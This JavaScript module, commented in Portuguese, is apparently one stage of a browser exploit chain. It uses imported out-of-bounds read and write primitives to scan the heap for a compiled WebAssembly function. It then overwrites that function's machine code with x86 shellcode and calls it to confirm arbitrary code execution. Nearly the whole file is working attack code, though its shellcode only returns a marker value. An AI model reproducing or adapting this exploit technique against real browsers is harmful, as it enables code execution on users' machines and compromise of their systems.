// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R51 - Ataque Wasm ACE)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    arb_read // Usaremos a leitura OOB para escanear a memória
} from '../core_exploit.mjs';

export const FNAME_MODULE_WASM_ACE_R51 = "WasmOverwrite_ACE_R51";

// NOVO: Nosso shellcode simples. Retorna 0x1337.
// Opcodes para:
// B8 37 13 00 00  -> mov eax, 0x1337
// C3              -> ret
const shellcode = new Uint8Array([0xb8, 0x37, 0x13, 0x00, 0x00, 0xc3]);

// NOVO: Nosso módulo Wasm simples em formato de texto (WAT).
// Exporta uma função 'target_func' que simplesmente retorna o valor 42.
const wasm_module_wat = `
(module
    (func (export "target_func") (result i32)
        i32.const 42
    )
)`;

// NOVO: Função helper para compilar o Wasm
async function compileWasm(wat_string) {
    // A conversão de WAT para Wasm binário normalmente requer uma ferramenta,
    // mas para um módulo tão simples, podemos usar um conversor online ou
    // uma biblioteca JS. Para este teste, usaremos um array de bytes pré-compilado.
    const wasm_binary = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
        0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x0f, 0x01, 0x0b, 0x74,
        0x61, 0x72, 0x67, 0x65, 0x74, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00,
        0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b
    ]);
    const module = await WebAssembly.compile(wasm_binary);
    const instance = await WebAssembly.instantiate(module, {});
    return instance;
}

export async function executeWasmOverwrite_R51() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_WASM_ACE_R51;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de ACE via Wasm ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Não iniciado.", errorOccurred: null };
    
    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R51): Preparação do Ambiente e Compilação Wasm ---`, "subtest", FNAME_CURRENT_TEST);
        
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
        
        // Compila nossa instância Wasm
        const wasm_instance = await compileWasm(wasm_module_wat);
        const wasm_func = wasm_instance.exports.target_func;
        
        const original_result = wasm_func();
        if (original_result !== 42) {
            throw new Error(`Função Wasm original não retornou 42. Retornou: ${original_result}`);
        }
        logS3(`[R51] Wasm compilado. Função original 'target_func()' retornou ${original_result} como esperado.`, 'good');

        // --- FASE 1: BUSCA PELO CÓDIGO WASM NA MEMÓRIA ---
        logS3(`--- Fase 1 (R51): Buscando Código Wasm na Memória ---`, "subtest", FNAME_CURRENT_TEST);
        
        // O corpo da nossa função Wasm (i32.const 42) compila para [0x41, 0x2A]. Este é nosso marcador.
        const WASM_FUNC_MARKER_A = 0x41;
        const WASM_FUNC_MARKER_B = 0x2A;

        const SCAN_START = new AdvancedInt64(0x800000000); // Começa em um endereço de heap comum
        const SCAN_SIZE = 0x20000000; // Escaneia 512MB
        const SCAN_STEP = 0x1000;
        let found_wasm_func_addr = null;

        for (let i = 0; i < SCAN_SIZE / SCAN_STEP; i++) {
            let current_addr = SCAN_START.add(i * SCAN_STEP);
            if (i > 0 && i % 256 === 0) { // Log de progresso
                 logS3(`[Scanner Wasm] Buscando em ${current_addr.toString(true)}...`, 'debug');
            }
            try {
                let val = await arb_read(current_addr, 1);
                if (val === WASM_FUNC_MARKER_A) {
                    let val_b = await arb_read(current_addr.add(1), 1);
                    if (val_b === WASM_FUNC_MARKER_B) {
                        found_wasm_func_addr = current_addr;
                        break;
                    }
                }
            } catch (e) { /* Ignora erros de leitura */ }
        }

        if (!found_wasm_func_addr) {
            throw new Error("Não foi possível encontrar o código da função Wasm na memória. A estratégia de busca falhou.");
        }
        logS3(`[R51] Código da função Wasm encontrado no endereço: ${found_wasm_func_addr.toString(true)}`, 'vuln');

        // --- FASE 2: SOBRESCRITA COM SHELLCODE ---
        logS3(`--- Fase 2 (R51): Sobrescrevendo código Wasm com Shellcode ---`, "subtest", FNAME_CURRENT_TEST);
        
        for (let i = 0; i < shellcode.length; i++) {
            await oob_write_absolute(found_wasm_func_addr.toNumber() + i, shellcode[i], 1);
        }
        logS3(`[R51] Shellcode escrito sobre a função Wasm.`, 'good');

        // --- FASE 3: GATILHO E VERIFICAÇÃO ---
        logS3(`--- Fase 3 (R51): Disparando a função corrompida ---`, "subtest", FNAME_CURRENT_TEST);

        const new_result = wasm_func();
        logS3(`[R51] Função corrompida retornou: ${toHex(new_result)}`, 'leak');

        if (new_result === 0x1337) {
            result.success = true;
            result.msg = "Execução de Código Arbitrário confirmada! Shellcode executado com sucesso.";
        } else {
            throw new Error(`Falha na verificação do ACE. Esperado 0x1337, recebido ${toHex(new_result)}.`);
        }
        
    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R51): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R51 test:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
